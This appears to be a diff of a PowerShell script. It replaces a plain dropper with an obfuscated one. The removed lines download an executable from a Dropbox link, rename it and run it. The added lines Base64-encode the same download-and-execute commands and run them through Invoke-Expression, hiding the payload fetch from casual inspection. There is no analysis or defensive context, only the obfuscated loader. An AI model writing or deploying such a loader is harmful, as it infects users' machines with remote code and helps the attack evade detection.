@@ -1,3 +1,2 @@
-Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/2idkbo5sf67k6j2t6vlu2/sss.exe?rlkey=cjwmhileubxma3p41x1buhwxv&st=dcf7g4k4&dl=1" -OutFile "$env:USERPROFILE\Downloads\sss.exe"; 
-Rename-Item -Path "$env:USERPROFILE\Downloads\sss.exe" -NewName "1.exe"; 
-Start-Process -FilePath "$env:USERPROFILE\Downloads\1.exe";
+$a = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('SW52b2tlLVdlYlJlcXVlc3QgLVVyaSAiaHR0cHM6Ly93d3cuZHJvcGJveC5jb20vc2NsL2ZpL2lpZGtibzVzZjY3azZqMnQ2dmx1Mi9zc3MuZXhlP3Jsa2V5PWNqd21oaWxldWJ4bWEzcDQxeDFidWh3eHYmc3Q9ZGNmN2c0azQmZGwxIjsgLU91dEZpbGUgIiR7ZW52OlVTRVJQUk9GSUxFfURvd25sb2Fkc1xzcy5leGUiOw0KUmluYW1lLUl0ZW0gLVBhdGggIiR7ZW52OlVTRVJQUk9GSUxFfURvd25sb2Fkc1xzcy5leGUiIC1OZXdOYW1lICIxLmV4ZSI7DQpTdGFydC1Qcm9jZXNzIC1GaWxlUGF0aCAiJHtFbnY6VVNFUlBST0ZJTEV9RG93bmxvYWRzXDFcMS5leGUiOw=='))
+iex $a
